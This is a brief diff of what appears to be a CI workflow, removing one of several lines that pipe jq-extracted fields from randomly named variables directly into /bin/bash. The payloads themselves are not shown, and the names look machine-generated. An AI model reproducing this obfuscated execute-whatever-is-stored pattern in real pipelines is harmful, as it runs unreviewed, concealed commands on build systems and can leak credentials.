@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$wrpcd1600" | jq -r .n9639 | /bin/bash
           echo $ywzsz0 | jq -r .jr3970 | /bin/bash
           echo $yfy19 | jq -r .l338 | /bin/bash
-          printf '%s' "$erejd71331" | jq -r .lsb44140 | /bin/bash
           echo $tdsu96331 | jq -r .rvvyr12455 | /bin/bash
           echo $dblep9408 | jq -r .nvw43 | /bin/bash
           printf '%s' "$k54" | jq -r .jct54973 | /bin/bash
